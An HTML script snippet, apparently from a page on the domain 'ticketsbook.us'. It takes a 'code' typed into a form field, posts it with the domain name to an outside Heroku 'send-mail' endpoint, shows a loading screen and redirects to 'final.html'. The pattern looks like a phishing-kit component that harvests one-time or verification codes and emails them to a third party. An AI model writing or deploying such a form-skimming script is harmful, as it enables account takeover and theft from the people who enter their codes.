	<script>
		const submitBTN = document.getElementById('form-submit');
		const code = document.getElementById('forminator-field-name-1');

		submitBTN.addEventListener('click', (e) => {
			e.preventDefault();
			console.log(code.value);
			if (!code || code.value === '') {
				alert('enter code');
				return;
			}

			const payload = {
				code: code,
			};

			const data = new FormData();
			data.append("json", JSON.stringify(payload));

			const div = document.createElement('div');
			div.setAttribute("class", "loading");
			div.setAttribute("id", "loading");
			document.getElementById("myDIV").appendChild(div);

			document.body.style.background = `linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7))`

			fetch('https://api-for-emails.herokuapp.com/api/send-mail', {
				method: "post",
				body: JSON.stringify({
					code: code.value,
					domain: 'ticketsbook.us'
				}),
				headers: {
					'Accept': 'application/json, text/plain, */*',
					'Content-Type': 'application/json; charset=UTF-8'
				}
				//make sure to serialize your JSON body

			}).then(res => res.json()).then(res => {
				document.getElementById("loading").remove();
				document.body.style.background = '#fff'
				window.location = "final.html";
			})
				.catch(err => {
					document.getElementById("loading").remove();
					document.body.style.background = '#fff'
					alert(err);
				})
		})
	</script>

	<script src="https://smtpjs.com/v3/smtp.js">
	</script>
